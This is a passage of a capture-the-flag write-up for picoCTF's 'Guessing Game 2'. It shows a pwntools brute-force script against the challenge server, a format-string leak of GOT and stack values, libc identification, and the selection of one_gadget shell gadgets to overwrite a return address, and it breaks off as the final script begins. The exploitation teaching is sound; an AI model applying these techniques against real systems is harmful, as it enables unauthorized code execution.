## Solution

This is the follow-up for [Guessing Game 1](Guessing_Game_1.md). Once more, we have a short program which randomly selects a number, and asks the user to guess it. If successful, the user can enter a name and be congratulated. 

Just like last time, the random number generated by `get_random()` isn't really random. However, at least last time it was pseudo-random. This time it's a constant! 

```c
long get_random() {
	return rand;
}
```

Instead of calling `rand()`, the function is returning the address of the `rand()` function modulus 4096. Why is this important? Because the address of `rand()` might be randomized by the loader, but if we apply modulus 4096 to it we effectively get a constant value:

Even if ASLR is enabled and `libc` gets loaded to a different address during each run, it still needs to get loaded to a page-aligned address, where pages are (usually) 4K. Therefore, the offset within each page needs to be constant, and in order to represent an offset within a 4K buffer we need 12 bits.

This means that the bottom 12 bits of `rand`'s address don't change between runs, only the top bits get randomized. When we apply modulus 4096 to a number, we are essentially extracting the bottom 12 bits of that number. In our case, since these bits aren't affected by ASLR, we actually get a constant result.

We still have to find the correct offset for `rand` though. Although for a given `LibC` the offset of `rand` within the library is constant, each `LibC` might have a different offset for `rand` and we don't which `LibC` the server is using. We'll get to that in a moment, but let's just perform a local sanity check before moving on.

We'll use `gdb` to check the `rand` offset on our local machine, and see if we can bypass the guess phase:

```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# gdb ./vuln -ex "set disable-randomization off" -ex "b main" -ex "r" -ex 'printf "rand = 0x%x\n", rand' -ex "set confirm off" -ex "q" -n | grep rand
rand = 0xf7d92860
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# gdb ./vuln -ex "set disable-randomization off" -ex "b main" -ex "r" -ex 'printf "rand = 0x%x\n", rand' -ex "set confirm off" -ex "q" -n | grep rand
rand = 0xf7dae860
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# gdb ./vuln -ex "set disable-randomization off" -ex "b main" -ex "r" -ex 'printf "rand = 0x%x\n", rand' -ex "set confirm off" -ex "q" -n | grep rand
rand = 0xf7d5d860
```

This command enables ASLR, then prints the `rand` offset and exits. We run it three times and we can see that we got three different results, although the bottom 12 bits are constant as we explained earlier. Now, according to the code, the calculation is:
```python
>>> (0xf7d92860 % 4096) + 1
2145
>>> (0xf7dae860 % 4096) + 1
2145
>>> (0xf7d5d860 % 4096) + 1
2145
```

Let's try it:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# ./vuln
Welcome to my guessing game!
Version: 2

What number would you like to guess?
2145
Nope!
```

That didn't work! 

The reason is that the C program treats the variables as `signed` integers, and a signed `long` with the value of `0xf7d92860` in a 32-bit program is interpreted as a negative number. The following program can demonstrate this:

```c
#include <stdio.h>

int main()
{
    long random = 0xf7d92860;
    long ans = (random % 4096) + 1;
    printf("random = %ld\n", random);
    printf("ans    = %ld\n", ans);

    return 0;
}
```

Output:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# gcc -m32 test.c -o test && ./test
random = -136763296
ans    = -1951
```

Let's try `-1951`:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# ./vuln
Welcome to my guessing game!
Version: 2

What number would you like to guess?
-1951
Congrats! You win! Your prize is this print statement!
```

This looks much better. We can mimic a similar behavior in Python using a negative modulus, e.g.:
```python
>>> (0xf7d92860 % -4096) + 1
-1951
```

Notice that this only happens if `LibC` gets loaded to an address which when interpreted as a signed `long` is considered negative (i.e. when the MSB is set). We don't know where the server's loader will load `LibC` to, but it is a fairly safe assumption that it will be loaded to such an address, therefore we'll assume that also on the server `ans` will end up negative.

We still need to find the correct offset/value to bypass the first phase. We have a few options:
1. Brute force all possible positive and negative value -> Too many values
2. Brute force all possible negative values -> Still around 4096 values, not very tempting
3. Use a `libc` database in order to create a list of known `rand` offsets, then try them

We'll go for option #3 using [libc-database](https://github.com/niklasb/libc-database). After downloading the database, we use the following script in order to try all known `rand` offsets:

```python
from pwn import *

import ctypes

from pathlib import Path
from collections import defaultdict, namedtuple

LIBC_DB_BASE = "../../../Utils/libc-database"
LIBC_DB_DUMP = Path(LIBC_DB_BASE, "dump")

Record = namedtuple("Record", "name offset")

def get_rand_offset_map():
    res = defaultdict(list)

    with log.progress('Retrieving rand() offsets') as p:
        for i, libc_path in enumerate(Path(LIBC_DB_BASE, "db").glob("*.so")):
            p.status(f"Read {i} libraries")
            with context.local(log_level='ERROR'):
                output = process('{} {} rand'.format(LIBC_DB_DUMP, libc_path.stem), shell=True).recvall().decode("ascii")
            offset = int(output.replace("offset_rand =", "").strip(), 16)
            guess = ctypes.c_int32((offset % -4096) + 1).value
            res[guess].append(Record(libc_path.stem, offset))
    return res

def test_guesses(rand_offset_map):
    with log.progress('Testing against server') as p:
        for i, guess in enumerate(rand_offset_map.keys()):
            p.status(f"Tested {i} offsets")
            with context.local(log_level='ERROR'):
                r = remote("jupiter.challenges.picoctf.org", 28953)
                r.recvuntil("What number would you like to guess?\n")
                r.sendline(str(guess))
                output = r.recvline()
                r.close()

                if b"Congrats" in output:
                    return guess
    return None

def main():
    rand_offset_map = get_rand_offset_map()
    log.info("Found {} unique guess values".format(len(rand_offset_map)))
    guess = test_guesses(rand_offset_map)
    if guess is not None:
        log.success(f"Found correct guess: '{guess}'")
        log.info("Matching libraries:")
        for record in rand_offset_map[guess]:
            log.info("0x{:#08x}: {}".format(record.offset, record.name))
    else:
        log.failure("Can't find correct guess")

if __name__ == "__main__":
    main()
```

Output:

```console
$ python3 guess_rand.py
[+] Retrieving rand() offsets: Done
[*] Found 178 unique guess values
[+] Testing against server: Done
[+] Found correct guess: '-31'
[*] Matching libraries:
[*] 0x0x02ffe0: libc6-i386_2.8~20080505-0ubuntu9_amd64
[*] 0x0x030fe0: libc6-i386_2.27-3ubuntu1.2_amd64
```

We can see that we were able to reduce the search range to < 200 values, and eventually we found out that `-31` is accepted as the correct guess:

```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# nc jupiter.challenges.picoctf.org 28953
Welcome to my guessing game!
Version: 2

What number would you like to guess?
-31
Congrats! You win! Your prize is this print statement!
```

Finally, we can proceed to the next phase. As opposed to the previous challenge, this time the binary does have a stack canary:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# (echo "-1951"; python -c "print('A'*513)") | ./vuln
Welcome to my guessing game!
Version: 2

What number would you like to guess?
Congrats! You win! Your prize is this print statement!

New winner!
Name? Congrats: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

*** stack smashing detected ***: <unknown> terminated
Aborted
```

So, no buffer overflow this time. It also dynamically linked:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# ldd ./vuln
        linux-gate.so.1 (0xf7f09000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d10000)
        /lib/ld-linux.so.2 (0xf7f0b000)
```

This means that we have less gadgets to play with.

Luckily we have a format string vulnerability, since user controlled input is passed directly to `printf` without sanitization:

```c
	gets(winner);
	printf("Congrats: ");
	printf(winner);
```

This allows us to print values from the stack:
```
New winner!
Name? %p.%p.%p.%p
Congrats: 0x200.0xf7f545c0.0x804877d.0x1
```

With some trial and error (or automation using `pwntools` as seen below), we can identify that the seventh offset allows us to read back a value that we entered:
```
Name? AAAA%7$p
Congrats: AAAA0x41414141
```

This allows us to read (almost) any memory address by using `%s`. We can leak the address of `rand` from the GOT by sending:
```
    00000000  f8 9f 04 08  25 37 24 73                            │····│%7$s│
```

The GOT address for `rand` (`0x08049ff8`) can be retrieved using the debugger:

```
gdb-peda$ got

/media/sf_CTFs/pico/Guessing_Game_2/vuln:     file format elf32-i386

DYNAMIC RELOCATION RECORDS

08049fec R_386_JUMP_SLOT   setresgid@GLIBC_2.0
```

We'll receive a response that the value is `0xf7dd6fe0`. Using the same method, we can dump the address of `atol` as well (it's `0xf7dd4770`). This allows us to determine which of the two libraries we saw earlier the server is actually using by searching for the `LibC` that has the combination of these offsets:

```console
root@kali:~/utils/libc-database# ./find rand fe0 atol 770 | awk '{printf $2}' && echo
(libc6-i386_2.27-3ubuntu1.2_amd64)
```

Let's check this library's info for full details regarding the offsets:
```console
root@kali:~/utils/libc-database# ./dump libc6-i386_2.27-3ubuntu1.2_amd64
offset___libc_start_main_ret = 0x18e91
offset_system = 0x0003cd80
offset_dup2 = 0x000e61b0
offset_read = 0x000e56c0
offset_write = 0x000e5790
offset_str_bin_sh = 0x17bb8f
root@kali:~/utils/libc-database# ./dump libc6-i386_2.27-3ubuntu1.2_amd64 atol
offset_atol = 0x0002e770
root@kali:~/utils/libc-database# ./dump libc6-i386_2.27-3ubuntu1.2_amd64 rand
offset_rand = 0x00030fe0
```

Back to the format string vulnerability, it also allows us to write to (almost) any address using `%n`. It might be tempting to try and overwrite a `.got.plt` entry with the address of `system`, but unfortunately the binary has `Full RELRO` protection:

```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# checksec --file=./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   80) Symbols       No    0               3               ./vuln
```

So, the next best thing is to skip over the stack canary and overwrite the `win` return address. For that, we need to first leak a stack address, then use it to calculate where the return address is located, and finally replace it.

We'll leak `win`'s `ebp`. Let's find it with the debugger.

First, we need a view of the stack at the point of the format string leak:

```assembly
|           0x080487c7      8d85f4fdffff   lea eax, [format]
|           0x080487cd      50             push eax                    ; const char *format
|           0x080487ce      e89dfcffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080487d3      83c410         add esp, 0x10
```

So, we set a breakpoint at `0x080487ce`:

```
gdb-peda$ b *0x080487ce
Breakpoint 1 at 0x80487ce
```

We can enter `"%p.%p.%p"` as the name (causing the program to print `"0x200.0xf7fb05c0.0x804877d"`), and in parallel view the stack in the debugger:

```
[------------------------------------stack-------------------------------------]
0000| 0xffffd110 --> 0xffffd12c ("%p.%p.%p")
0004| 0xffffd114 --> 0x200
0008| 0xffffd118 --> 0xf7fb05c0 --> 0xfbad2288
0012| 0xffffd11c --> 0x804877d (<win+15>:       add    ebx,0x183f)
0016| 0xffffd120 --> 0x1
0020| 0xffffd124 --> 0xfffff861
0024| 0xffffd128 --> 0xfffff861
0028| 0xffffd12c ("%p.%p.%p")
```

As we can see, the values printed by the program are also visible via the stack view. We're looking for `ebp` which is located right before `ret`. The `ret` value we're expecting is `0x0804888c`:
```assembly
|       :   0x08048887      e8e2feffff     call sym.win
\       `=< 0x0804888c      ebeb           jmp 0x8048879
```

Searching for it in the stack:
```
gdb-peda$ find 0x0804888c stack
Searching for '0x0804888c' in: stack ranges
Found 1 results, display max 1 items:
[stack] : 0xffffd33c --> 0x804888c (<main+141>: jmp    0x8048879 <main+122>)
```

So the return address is the 139th DWORD from our location:
```python
>>> (0xffffd33c - 0xffffd110) / 4
139.0
```

This makes `ebp` the 138th DWORD from our location:
```
gdb-peda$ p/x *(int*)($esp + 139 * 4)
$16 = 0x804888c
gdb-peda$ p/x *(int*)($esp + 138 * 4)
$17 = 0xffffd358
```

We got an address on the stack: `0xffffd358`. We can calculate the diff between this address and the stack address of the return address:
```python
>>> 0xffffd358 - 0xffffd33c
28
```

So we finally know that if we leak the 138th value from the stack and subtract 28 from it, we get the address of `ret`. That's the address we want to overwrite.

The last question is what to overwrite `ret` with. We'll just use [`one_gadget`](https://github.com/david942j/one_gadget): 

```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# one_gadget libc6-i386_2.27-3ubuntu1.2_amd64.so
0x3cc5a execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x3cc5c execve("/bin/sh", esp+0x38, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x38] == NULL

0x3cc60 execve("/bin/sh", esp+0x3c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x3c] == NULL

0x3cc67 execve("/bin/sh", esp+0x40, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x40] == NULL

0x6730f execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x67310 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL

0x13593e execl("/bin/sh", eax)
constraints:
  ebx is the GOT address of libc
  eax == NULL

0x13593f execl("/bin/sh", [esp])
constraints:
  ebx is the GOT address of libc
  [esp] == NULL
```

These gadgets seem to have a cryptic constraint: "esi is the GOT address of libc". There's some information about it [here](https://github.com/david942j/one_gadget/issues/130). In short, they explain that this means that `esi` needs to be the value of `libc_base` + `readelf -d /path/to/libc | grep PLTGOT`, but usually `esi` already has this value in `main`. Luckily, in our case, `main` is calling `win`.

Once we overwrite `ret` with `one gadget`, we'll get a shell. Putting it all together as a `pwntools` script, we get:

```python
# Create template using:
# $ pwn template --host jupiter.challenges.picoctf.org --port 28953 ./vuln
